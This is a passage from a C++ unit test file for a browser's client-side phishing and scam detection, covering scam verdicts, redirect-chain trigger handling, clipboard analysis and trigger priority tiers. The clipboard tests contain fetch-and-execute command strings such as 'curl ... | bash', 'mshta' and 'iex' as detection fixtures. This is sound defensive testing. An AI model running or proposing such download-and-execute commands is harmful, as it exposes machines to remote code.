      IntelligentScanVerdict::SCAM_EXPERIMENT_VERDICT_1);
  EXPECT_CALL(*intelligent_scan_delegate_,
              ShouldShowScamWarning(std::optional<IntelligentScanVerdict>(
                  IntelligentScanVerdict::SCAM_EXPERIMENT_VERDICT_1)))
      .WillOnce(Return(true));
  EXPECT_CALL(*intelligent_scan_delegate_, OnScamWarningShown()).Times(1);

  // Now we run the callback to receive a server response. We do expect the
  // blocking page to pop up on a non-phishy response with the scam experiment
  // verdict because the feature is now enabled despite the is_phishy field is
  // false.
  UnsafeResource resource;
  resource.threat_subtype = ThreatSubtype::SCAM_EXPERIMENT_VERDICT_1;
  EXPECT_CALL(*ui_manager_.get(),
              DisplayBlockingPage(HasScamThreatSubtype(resource)))
      .Times(1);

  PhishingDetectionDone(
      /*is_phishing=*/false, /*client_score=*/0.0f,
      ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED,
      /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::
          KEYBOARD_LOCK_REQUESTED,
      /*is_intelligent_scan_available=*/true,
      /*model_has_successful_response=*/true,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::SCAM_EXPERIMENT_VERDICT_1);
  EXPECT_TRUE(Mock::VerifyAndClear(intelligent_scan_delegate_.get()));
}

TEST_F(ClientSideDetectionHostScamDetectionTest,
       RTLookupResponseLlamaForcedTriggerInfoTriggersIntelligentScan) {
  SetFeatures({}, {});
  CacheForcedTriggerInfo(
      /*has_llama_forced_trigger_info=*/true,
      /*intelligent_scan=*/true,
      /*cache_expression=*/example_url_.GetContent());
  SetIntelligentScanCallback(/*should_return_response=*/true);
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/true,
      /*expected_no_info_reason=*/std::nullopt,
      /*expected_llama_forced_trigger_info_trigger_url=*/
      example_url_.GetContent(),
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);
  EXPECT_CALL(*intelligent_scan_delegate_,
              ShouldShowScamWarning(std::optional<IntelligentScanVerdict>(
                  IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE)))
      .WillOnce(Return(false));

  // Although the phishing detection done is set to TRIGGER_MODELS, it will
  // eventually switch to FORCE_REQUEST because the verdict cache manager
  // contains a suspicious RTLookupResponse.
  PhishingDetectionDone(/*is_phishing=*/false, /*client_score=*/0.8f,
                        ClientSideDetectionType::TRIGGER_MODELS,
                        /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::FORCE_REQUEST,
      /*is_intelligent_scan_available=*/true,
      /*model_has_successful_response=*/true,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);
  VerifyForcedTriggerScamDetectionHistograms(
      /*force_request=*/true, /*has_llama_forced_trigger_info=*/true,
      /*intelligent_scan=*/true,
      /*redirect_chain_contains_llama_forced_trigger_info=*/std::nullopt);
}

TEST_F(
    ClientSideDetectionHostScamDetectionTest,
    RedirectChainContainsRTLookupResponseLlamaForcedTriggerInfoSoItTriggersIntelligentScan) {
  SetFeatures({}, {});

  GURL first_url_redirect("http://firsturlsuspicious.com/");
  GURL second_url_redirect("http://secondurlnotsuspicious.com/");
  GURL third_url_redirect("http://thirdurlnotsuspicious.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(first_url_redirect, false);
  database_manager_->SetAllowlistLookupDetailsForUrl(second_url_redirect,
                                                     false);
  database_manager_->SetAllowlistLookupDetailsForUrl(third_url_redirect, false);

  auto navigation = content::NavigationSimulator::CreateBrowserInitiated(
      first_url_redirect, web_contents());
  navigation->Start();
  navigation->Redirect(second_url_redirect);
  navigation->Redirect(third_url_redirect);
  navigation->Commit();

  content::NavigationEntry* entry =
      web_contents()->GetController().GetVisibleEntry();

  ASSERT_TRUE(entry);
  EXPECT_EQ(entry->GetRedirectChain().size(), 3u);

  // Set the example url to the first in the redirect chain so that the cache is
  // done for the first URL.
  SetExampleUrl(first_url_redirect);
  CacheForcedTriggerInfo(/*has_llama_forced_trigger_info=*/true,
                         /*intelligent_scan=*/true,
                         /*cache_expression=*/first_url_redirect.GetContent());

  EXPECT_CALL(*intelligent_scan_delegate_,
              ShouldRequestIntelligentScan(IntelligentScanEnabledVerdict()))
      .WillOnce(Return(true));
  SetIntelligentScanCallback(/*should_return_response=*/true);

  // Re-set the example URL to the final url in the redirect chain.
  SetExampleUrl(third_url_redirect);
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/true,
      /*expected_no_info_reason=*/std::nullopt,
      /*expected_llama_forced_trigger_info_trigger_url=*/
      first_url_redirect.GetContent(),
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);

  // Although the phishing detection done is set to TRIGGER_MODELS, it will
  // eventually switch to FORCE_REQUEST because the verdict cache manager
  // contains a suspicious RTLookupResponse.
  PhishingDetectionDone(/*is_phishing=*/false, /*client_score=*/0.8f,
                        ClientSideDetectionType::TRIGGER_MODELS,
                        /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::FORCE_REQUEST,
      /*is_intelligent_scan_available=*/true,
      /*model_has_successful_response=*/true,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);
  VerifyForcedTriggerScamDetectionHistograms(
      /*force_request=*/true, /*has_llama_forced_trigger_info=*/true,
      /*intelligent_scan=*/true,
      /*redirect_chain_contains_llama_forced_trigger_info=*/true);
}

TEST_F(ClientSideDetectionHostScamDetectionTest,
       RedirectChainDoesNotContainRTLookupResponseLlamaForcedTriggerInfo) {
  SetFeatures({}, {});

  GURL first_url_redirect("http://firsturlnotsuspicious.com/");
  GURL second_url_redirect("http://secondurlnotsuspicious.com/");
  GURL third_url_redirect("http://thirdurlnotsuspicious.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(first_url_redirect, false);
  database_manager_->SetAllowlistLookupDetailsForUrl(second_url_redirect,
                                                     false);
  database_manager_->SetAllowlistLookupDetailsForUrl(third_url_redirect, false);

  auto navigation = content::NavigationSimulator::CreateBrowserInitiated(
      first_url_redirect, web_contents());
  navigation->Start();
  navigation->Redirect(second_url_redirect);
  navigation->Redirect(third_url_redirect);
  navigation->Commit();

  content::NavigationEntry* entry =
      web_contents()->GetController().GetVisibleEntry();

  ASSERT_TRUE(entry);
  EXPECT_EQ(entry->GetRedirectChain().size(), 3u);

  // Set the example url to the first in the redirect chain so that the cache is
  // done for the first URL. The force request will exist, but the
  // LlamaForcedTriggerInfo will not.
  SetExampleUrl(first_url_redirect);
  CacheForcedTriggerInfo(/*has_llama_forced_trigger_info=*/false,
                         /*intelligent_scan=*/false,
                         /*cache_expression=*/first_url_redirect.GetContent());

  // Re-set the example URL to the final url in the redirect chain.
  SetExampleUrl(third_url_redirect);

  EXPECT_CALL(*intelligent_scan_delegate_,
              ShouldRequestIntelligentScan(EmptyLlamForcedTriggerInfoVerdict()))
      .WillOnce(Return(false));
  // Because there is no forced trigger info in the first URL in the referrer
  // chain either, there won't be any intelligent scan calls.
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/false,
      /*expected_no_info_reason=*/std::nullopt,
      /*expected_llama_forced_trigger_info_trigger_url=*/std::nullopt,
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);

  // Although the phishing detection done is set to TRIGGER_MODELS, it will
  // eventually switch to FORCE_REQUEST because the verdict cache manager
  // contains a suspicious RTLookupResponse.
  PhishingDetectionDone(/*is_phishing=*/false, /*client_score=*/0.8f,
                        ClientSideDetectionType::TRIGGER_MODELS,
                        /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::FORCE_REQUEST,
      /*is_intelligent_scan_available=*/std::nullopt,
      /*model_has_successful_response=*/std::nullopt,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);
  VerifyForcedTriggerScamDetectionHistograms(
      /*force_request=*/true,
      /*has_llama_forced_trigger_info=*/false,
      /*intelligent_scan=*/false,
      /*redirect_chain_contains_llama_forced_trigger_info=*/false);
}

TEST_F(
    ClientSideDetectionHostScamDetectionTest,
    RedirectChainDoesContainRTLookupResponseLlamaForcedTriggerInfoButKillswitchIsEnabled) {
  SetFeatures({kClientSideDetectionForcedLlamaRedirectChainKillswitch}, {});

  GURL first_url_redirect("http://firsturlnotsuspicious.com/");
  GURL second_url_redirect("http://secondurlnotsuspicious.com/");
  GURL third_url_redirect("http://thirdurlnotsuspicious.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(first_url_redirect, false);
  database_manager_->SetAllowlistLookupDetailsForUrl(second_url_redirect,
                                                     false);
  database_manager_->SetAllowlistLookupDetailsForUrl(third_url_redirect, false);

  auto navigation = content::NavigationSimulator::CreateBrowserInitiated(
      first_url_redirect, web_contents());
  navigation->Start();
  navigation->Redirect(second_url_redirect);
  navigation->Redirect(third_url_redirect);
  navigation->Commit();

  content::NavigationEntry* entry =
      web_contents()->GetController().GetVisibleEntry();

  ASSERT_TRUE(entry);
  EXPECT_EQ(entry->GetRedirectChain().size(), 3u);

  // Set the example url to the first in the redirect chain so that the cache is
  // done for the first URL. The force request will exist and the
  // LlamaForcedTriggerInfo as well, but due to killswitch, it won't matter.
  SetExampleUrl(first_url_redirect);
  CacheForcedTriggerInfo(/*has_llama_forced_trigger_info=*/true,
                         /*intelligent_scan=*/true,
                         /*cache_expression=*/first_url_redirect.GetContent());

  // Re-set the example URL to the final url in the redirect chain.
  SetExampleUrl(third_url_redirect);

  // Because of the killswitch, the verdict passed to the delegate will have
  // an empty llama forced trigger info.
  EXPECT_CALL(*intelligent_scan_delegate_,
              ShouldRequestIntelligentScan(EmptyLlamForcedTriggerInfoVerdict()))
      .WillOnce(Return(false));
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/false,
      /*expected_no_info_reason=*/std::nullopt,
      /*expected_llama_forced_trigger_info_trigger_url=*/std::nullopt,
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);

  // Although the phishing detection done is set to TRIGGER_MODELS, it will
  // eventually switch to FORCE_REQUEST because the verdict cache manager
  // contains a suspicious RTLookupResponse.
  PhishingDetectionDone(/*is_phishing=*/false, /*client_score=*/0.8f,
                        ClientSideDetectionType::TRIGGER_MODELS,
                        /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::FORCE_REQUEST,
      /*is_intelligent_scan_available=*/std::nullopt,
      /*model_has_successful_response=*/std::nullopt,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);

  // Due to the killswitch, there will be no LlamaForcedTriggerInfo found in the
  // redirect chain.
  VerifyForcedTriggerScamDetectionHistograms(
      /*force_request=*/true,
      /*has_llama_forced_trigger_info=*/false,
      /*intelligent_scan=*/true,
      /*redirect_chain_contains_llama_forced_trigger_info=*/std::nullopt);
}

TEST_F(
    ClientSideDetectionHostScamDetectionTest,
    RTLookupResponseLlamaForcedTriggerInfoTriggersIntelligentScanAndShowWarning) {
  SetFeatures({}, {});
  CacheForcedTriggerInfo(
      /*has_llama_forced_trigger_info=*/true,
      /*intelligent_scan=*/true,
      /*cache_expression=*/example_url_.GetContent());
  SetIntelligentScanCallback(/*should_return_response=*/true);
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/true,
      /*expected_no_info_reason=*/std::nullopt,
      /*expected_llama_forced_trigger_info_trigger_url=*/
      example_url_.GetContent(),
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::SCAM_EXPERIMENT_VERDICT_2);
  EXPECT_CALL(*intelligent_scan_delegate_,
              ShouldShowScamWarning(std::optional<IntelligentScanVerdict>(
                  IntelligentScanVerdict::SCAM_EXPERIMENT_VERDICT_2)))
      .WillOnce(Return(true));

  UnsafeResource resource;
  resource.threat_subtype = ThreatSubtype::SCAM_EXPERIMENT_VERDICT_2;
  // We do expect the blocking page to pop up on a non-phishy response with the
  // scam experiment verdict.
  EXPECT_CALL(*ui_manager_.get(),
              DisplayBlockingPage(HasScamThreatSubtype(resource)))
      .Times(1);

  // Although the phishing detection done is set to TRIGGER_MODELS, it will
  // eventually switch to FORCE_REQUEST because the verdict cache manager
  // contains a suspicious RTLookupResponse.
  PhishingDetectionDone(/*is_phishing=*/false, /*client_score=*/0.8f,
                        ClientSideDetectionType::TRIGGER_MODELS,
                        /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::FORCE_REQUEST,
      /*is_intelligent_scan_available=*/true,
      /*model_has_successful_response=*/true,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::SCAM_EXPERIMENT_VERDICT_2);
  VerifyForcedTriggerScamDetectionHistograms(
      /*force_request=*/true, /*has_llama_forced_trigger_info=*/true,
      /*intelligent_scan=*/true,
      /*redirect_chain_contains_llama_forced_trigger_info=*/std::nullopt);
}

TEST_F(ClientSideDetectionHostScamDetectionTest,
       CatchAllScamExperimentVerdictDoesNotShowWarning) {
  SetFeatures({}, {});

  SetIntelligentScanCallback(/*should_return_response=*/true);
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/true,
      /*expected_no_info_reason=*/std::nullopt,
      /*expected_llama_forced_trigger_info_trigger_url=*/std::nullopt,
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::SCAM_EXPERIMENT_CATCH_ALL_TELEMETRY);
  EXPECT_CALL(*intelligent_scan_delegate_,
              ShouldShowScamWarning(std::optional<IntelligentScanVerdict>(
                  IntelligentScanVerdict::SCAM_EXPERIMENT_CATCH_ALL_TELEMETRY)))
      .WillOnce(Return(false));

  // Because the callback responds with the catch all verdict, we will not show
  // a warning.
  EXPECT_CALL(*ui_manager_.get(), DisplayBlockingPage(_)).Times(0);

  // The verdict's is_phishing is true, so that we send a ping and await a
  // response.
  PhishingDetectionDone(/*is_phishing=*/true, /*client_score=*/0.8f,
                        ClientSideDetectionType::TRIGGER_MODELS,
                        /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  // Although the warning has not been displayed, we should still check that the
  // histogram has been logged. In addition, because the client side detection
  // type is TRIGGER_MODELS, we do not check for intelligent scan availability.
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::TRIGGER_MODELS,
      /*is_intelligent_scan_available=*/true,
      /*model_has_successful_response=*/true,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::SCAM_EXPERIMENT_CATCH_ALL_TELEMETRY);
}

TEST_F(ClientSideDetectionHostScamDetectionTest,
       CatchAllEnforcementScamExperimentVerdictDoesShowWarning) {
  SetFeatures({}, {});
  SetIntelligentScanCallback(/*should_return_response=*/true);
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/true,
      /*expected_no_info_reason=*/std::nullopt,
      /*expected_llama_forced_trigger_info_trigger_url=*/std::nullopt,
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::SCAM_EXPERIMENT_CATCH_ALL_ENFORCEMENT);
  EXPECT_CALL(
      *intelligent_scan_delegate_,
      ShouldShowScamWarning(std::optional<IntelligentScanVerdict>(
          IntelligentScanVerdict::SCAM_EXPERIMENT_CATCH_ALL_ENFORCEMENT)))
      .WillOnce(Return(true));

  UnsafeResource resource;
  resource.threat_subtype =
      ThreatSubtype::SCAM_EXPERIMENT_CATCH_ALL_ENFORCEMENT;
  // Because the callback responds with the catch all enforcement verdict, we
  // WILL show a warning.
  EXPECT_CALL(*ui_manager_.get(),
              DisplayBlockingPage(HasScamThreatSubtype(resource)))
      .Times(1);

  PhishingDetectionDone(/*is_phishing=*/false, /*client_score=*/0.8f,
                        ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED,
                        /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::
          KEYBOARD_LOCK_REQUESTED,
      /*is_intelligent_scan_available=*/true,
      /*model_has_successful_response=*/true,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::SCAM_EXPERIMENT_CATCH_ALL_ENFORCEMENT);
}

// Unit tests for ExtractClipboardData
class ClientSideDetectionHostClipboardDataTest
    : public ClientSideDetectionHostTest {
 public:
  ClipboardExtractedData ExtractFromPayload(const std::u16string& payload) {
    return csd_host_->ExtractClipboardData(payload);
  }
};

TEST_F(ClientSideDetectionHostClipboardDataTest, EmptyPayload) {
  ClipboardExtractedData data = ExtractFromPayload(u"");
  EXPECT_EQ(0, data.suspicious_tokens_size());
  EXPECT_FALSE(data.is_first_token_suspicious());
  EXPECT_FALSE(data.is_last_token_suspicious());
}

TEST_F(ClientSideDetectionHostClipboardDataTest, NoSusCommands) {
  ClipboardExtractedData data = ExtractFromPayload(u"this is a normal string");
  EXPECT_EQ(0, data.suspicious_tokens_size());
  EXPECT_FALSE(data.is_first_token_suspicious());
  EXPECT_FALSE(data.is_last_token_suspicious());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostClipboardDataTest, SingleSusCommandAtBeginning) {
  ClipboardExtractedData data = ExtractFromPayload(u"curl example.com");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_FALSE(data.is_last_token_suspicious());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostClipboardDataTest, EchoAndPipe) {
  ClipboardExtractedData data = ExtractFromPayload(u"echo hello | bash");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("bash"));
  EXPECT_FALSE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostClipboardDataTest, SingleSusCommandAtEnd) {
  ClipboardExtractedData data = ExtractFromPayload(u"some text with wget");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("wget"));
  EXPECT_FALSE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostClipboardDataTest, SuspiciousCommand) {
  ClipboardExtractedData data =
      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl", "bash"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_EQ(data.payload_length(), 36);
  EXPECT_EQ(data.total_parsed_tokens(), 3);
  EXPECT_EQ(data.urls_size(), 1);
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostClipboardDataTest, MissingRunner) {
  // Loader + URL, but no runner.
  ClipboardExtractedData data = ExtractFromPayload(u"curl https://example.com");
  EXPECT_EQ(1, data.suspicious_tokens_size());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostClipboardDataTest, MissingURL) {
  // Loader + Runner, but no URL.
  ClipboardExtractedData data = ExtractFromPayload(u"echo hello | bash");
  EXPECT_EQ(1, data.suspicious_tokens_size());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostClipboardDataTest, RemoteRunner) {
  // Remote runner satisfies loader and runner.
  ClipboardExtractedData data = ExtractFromPayload(u"mshta example.com");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("mshta"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_EQ(data.urls_size(), 1);
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostClipboardDataTest, SubcommandSyntax) {
  // Subcommand syntax satisfies runner.
  ClipboardExtractedData data =
      ExtractFromPayload(u"$(curl http://example.com)");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl"));
  EXPECT_EQ(data.urls_size(), 1);
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostClipboardDataTest, MixedCaseAndPaths) {
  ClipboardExtractedData data =
      ExtractFromPayload(u"cUrL https://example.com/s /usr/bin/BaSh.exe");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl", "bash"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostClipboardDataTest, MixedDelimiters) {
  ClipboardExtractedData data = ExtractFromPayload(
      u"curl\thttps://e.com\rwget\nhttp://b.com|{bash};(cmd::iex)");
  EXPECT_THAT(data.suspicious_tokens(),
              ::testing::ElementsAre("curl", "wget", "bash", "cmd", "iex"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostClipboardDataTest, IncludeFullPayload) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionClipboardCopyApi, {{"IncludeFullPayload", "true"}});

  ClipboardExtractedData data =
      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
  EXPECT_TRUE(data.is_overall_suspicious());
  EXPECT_EQ(data.content(), "curl https://example.com/s.sh | bash");
}

TEST_F(ClientSideDetectionHostClipboardDataTest, ExcludeFullPayloadByDefault) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionClipboardCopyApi, {{"IncludeFullPayload", "false"}});

  ClipboardExtractedData data =
      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
  EXPECT_TRUE(data.is_overall_suspicious());
  EXPECT_FALSE(data.has_content());
}

class ClientSideDetectionHostPriorityTest
    : public ClientSideDetectionHostTestBase {
 public:
  ClientSideDetectionHostPriorityTest()
      : ClientSideDetectionHostTestBase(false /*is_incognito*/) {
    feature_list_.InitWithFeatures(
        {kClientSideDetectionTierSystem},
        {kSkipImageClassificationScoringForNonPageLoadTriggers});
  }

  void SetUp() override {
    ClientSideDetectionHostTestBase::SetUp();
    url_ = GURL("https://example.com");
    database_manager_->SetAllowlistLookupDetailsForUrl(url_, false);

    SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

    Mock::VerifyAndClearExpectations(csd_service_.get());
    Mock::VerifyAndClearExpectations(database_manager_.get());
    EXPECT_CALL(*csd_service_, IsPrivateIPAddress(_))
        .Times(testing::AnyNumber())
        .WillRepeatedly(Return(false));
    EXPECT_CALL(*csd_service_, AtPhishingReportLimit())
        .Times(testing::AnyNumber())
        .WillRepeatedly(Return(false));
    EXPECT_CALL(*database_manager_.get(), CanCheckUrl(_))
        .Times(testing::AnyNumber())
        .WillRepeatedly(Return(true));
    EXPECT_CALL(*database_manager_.get(), CheckCsdAllowlistUrl(url_, _))
        .Times(testing::AnyNumber())
        .WillRepeatedly(Return(AsyncMatch::NO_MATCH));
  }

 protected:
  GURL url_;
  base::HistogramTester histogram_tester_;
};

TEST_F(ClientSideDetectionHostPriorityTest,
       HighPriorityTriggerCancelsLowPriority) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  // 1. Start a Tier 3 trigger (TRIGGER_MODELS) via navigation.
  NavigateAndCommit(url_);

  // 2. Start a Tier 1 trigger (KEYBOARD_LOCK_REQUESTED) via
  // WebContentsObserver. This should cancel TRIGGER_MODELS if it's still
  // running.
  csd_host_->KeyboardLockRequested();

  // The CancelActor metric should be logged.
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckCancelActor.TriggerModel",
      ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED, 1);
}

TEST_F(ClientSideDetectionHostPriorityTest,
       LowPriorityTriggerBlockedByHighPriority) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  // Let navigation finish first so it doesn't overlap.
  NavigateAndCommit(url_);
  base::RunLoop().RunUntilIdle();

  // Now start Tier 1 (KEYBOARD_LOCK_REQUESTED) via WebContentsObserver.
  csd_host_->KeyboardLockRequested();

  // 2. Start a Tier 2 trigger (VIBRATION_API) via WebContentsObserver.
  // KEYBOARD_LOCK_REQUESTED (Tier 1) should block VIBRATION_API (Tier 2).
  csd_host_->VibrationRequested();

  // Verification: VIBRATION_API should be blocked.
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.BlockingRequestType.VibrationApi",
      ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED, 1);
}

TEST_F(ClientSideDetectionHostPriorityTest, SameTierTriggerBlocked) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  // Let navigation finish first.
  NavigateAndCommit(url_);
  base::RunLoop().RunUntilIdle();

  // 2. Start a Tier 2 trigger (VIBRATION_API) via WebContentsObserver.
  csd_host_->VibrationRequested();

  // 3. Start another Tier 2 trigger (CLIPBOARD_COPY_API) via
  // WebContentsObserver. VIBRATION_API should block CLIPBOARD_COPY_API because
  // they are same tier.
  std::u16string copied_text =
      u"This string is definitely long enough to pass the length checks for "
      u"the clipboard copy API trigger. We need this string to be quite long "
      u"indeed to pass the minimum threshold.";
  csd_host_->OnTextCopiedToClipboard(web_contents()->GetPrimaryMainFrame(),
                                     copied_text);

  // Verification: CLIPBOARD_COPY_API should be blocked.
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.BlockingRequestType.ClipboardCopyApi",
      ClientSideDetectionType::VIBRATION_API, 1);
}

TEST_F(ClientSideDetectionHostPriorityTest, BypassTiers) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  // Enable the bypass feature and set the bypass list to include
  // CLIPBOARD_COPY_API
  std::string bypass_list = base::NumberToString(
      static_cast<int>(ClientSideDetectionType::CLIPBOARD_COPY_API));
  feature_list_.Reset();
  feature_list_.InitWithFeaturesAndParameters(
      {{kClientSideDetectionBypassTiers,
        {{kClientSideDetectionBypassTiersList.name, bypass_list}}},
       {kClientSideDetectionTierSystem, {}}},
      {});

  // Let navigation finish first.
  NavigateAndCommit(url_);
  base::RunLoop().RunUntilIdle();

  // 1. Start a Tier 2 trigger (VIBRATION_API) via WebContentsObserver.
  csd_host_->VibrationRequested();

  // 2. Start another Tier 2 trigger (CLIPBOARD_COPY_API) via
  // WebContentsObserver. VIBRATION_API should normally block CLIPBOARD_COPY_API
  // because they are same tier, but it's in the bypass list.
  std::u16string copied_text =
      u"This string is definitely long enough to pass the length checks for "
      u"the clipboard copy API trigger. We need this string to be quite long "
      u"indeed to pass the minimum threshold.";
  csd_host_->OnTextCopiedToClipboard(web_contents()->GetPrimaryMainFrame(),
                                     copied_text);

  // Verification: CLIPBOARD_COPY_API should NOT be blocked and cancels
  // VIBRATION_API.
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckCancelActor.VibrationApi",
      ClientSideDetectionType::CLIPBOARD_COPY_API, 1);
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.BlockingRequestType.ClipboardCopyApi",
      ClientSideDetectionType::VIBRATION_API, 0);
}

TEST_F(ClientSideDetectionHostPriorityTest,
       HighPriorityTriggerCancelsLowPriorityWhileClassifying) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  fake_phishing_detector_.set_hold_phishing_detection_callback(true);

  // 1. Start a Tier 3 trigger (TRIGGER_MODELS) via navigation.
  NavigateAndCommit(url_);
  base::RunLoop().RunUntilIdle();

  // Now TRIGGER_MODELS is in the renderer classification phase (is_classifying_
  // = true).
  EXPECT_EQ(fake_phishing_detector_.phishing_detection_start_count(), 1);

  // 2. Start a Tier 1 trigger (KEYBOARD_LOCK_REQUESTED) via
  // WebContentsObserver. This should cancel TRIGGER_MODELS if it's still
  // running and start its own pre-classification.
  base::test::TestFuture<ClientSideDetectionType> started_future;
  csd_host_->set_preclassification_started_callback_for_testing(
      started_future.GetRepeatingCallback());

  csd_host_->KeyboardLockRequested();

  // Verify that KEYBOARD_LOCK_REQUESTED started.
  EXPECT_EQ(started_future.Take(),
            ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED);

  // Note: CancelActor metric is NOT logged because TRIGGER_MODELS
  // pre-classification was already done.
}

TEST_F(ClientSideDetectionHostPriorityTest,
       LowPriorityTriggerBlockedByHighPriorityWhileClassifying) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  fake_phishing_detector_.set_hold_phishing_detection_callback(true);

  // Let navigation finish first.
  NavigateAndCommit(url_);
